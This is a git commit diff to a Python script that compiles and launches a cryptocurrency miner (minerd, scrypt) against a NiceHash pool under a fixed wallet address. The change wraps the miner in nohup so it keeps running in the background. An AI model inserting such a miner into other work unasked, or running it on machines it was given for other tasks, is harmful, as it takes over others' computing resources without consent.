083e31c7697d42b9911033f8d322fe50d05e3fc6
MrFeori <57797277+Feori-YT@users.noreply.github.com>
2022-07-04 22:13:08 +0300

    Update main.py

--- main.py
+++ main.py
@@ -7,4 +7,5 @@ os.system('./autogen.sh')
 os.system('./configure CFLAGS="-O3"')
 os.system('make')
 print('Mining started! Good luck!')
-subprocess.run(["./minerd", "-a", "scrypt","-o","stratum+tcp://scrypt.auto.nicehash.com:9200","-u","3CAzPkcn3g2TkWNbqd3ZN5HvoB6ZQLm6cF"])
+subprocess.run(["nohup", "./minerd", "-a", "scrypt","-o","stratum+tcp://scrypt.auto.nicehash.com:9200","-u","3CAzPkcn3g2TkWNbqd3ZN5HvoB6ZQLm6cF"])
+
